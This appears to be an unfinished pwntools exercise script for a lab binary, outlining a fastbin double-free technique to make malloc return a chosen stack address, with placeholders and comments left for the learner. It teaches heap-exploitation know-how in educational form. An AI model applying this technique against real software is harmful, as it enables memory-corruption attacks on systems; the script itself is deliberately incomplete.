#!/usr/bin/env python
# -*- coding: utf-8 -*-
from pwn import *
import sys
import re
import os
#from termcolor import cprint

from struct import pack

"""
UAF -- Fastbin double free into stack Scaffolding
The UFast DRISS vulnerability
1) Add items to heap
2) Free X, free Y, free X
3) Malloc and set to address of choice
4) Call malloc until it returns the address above

"""

if 'TMUX' in os.environ:
    context.terminal = ['tmux', 'splitw','-p','75']

context.log_level = 'debug'

conn = process("./sss-fb-dup-stack")

#
# gdb.attach(p, """
#     break * 0x400978
#     ignore 1 5
#     continue
#     """)

# fill first three with data
conn.recvuntil("[buy, sell, list, hello, quit] \n")
conn.sendline("buy")
conn.sendline("A" * 8 + "a" * 8 + "A" * 8 + "a" * 8 + "A" * 8 + "a" * 8)
conn.recvuntil("[buy, sell, list, hello, quit] \n")
conn.sendline("buy")
conn.sendline("B" * 8 + "b" * 8 + "B" * 8 + "b" * 8 + "B" * 8 + "b" * 8)
conn.recvuntil("[buy, sell, list, hello, quit] \n")
conn.sendline("buy")
conn.sendline("C" * 8 + "c" * 8 + "C" * 8 + "c" * 8 + "C" * 8 + "c" * 8)

# sell, what order, and how many?
conn.recvuntil("[buy, sell, list, hello, quit] \n")
conn.sendline("sell")
conn.sendline(????????)
# ...


# Check out source to find and extract leaked location, where is that?


# Do something with address



# How many more names to buy before our inserted one is returned by malloc




conn.interactive()
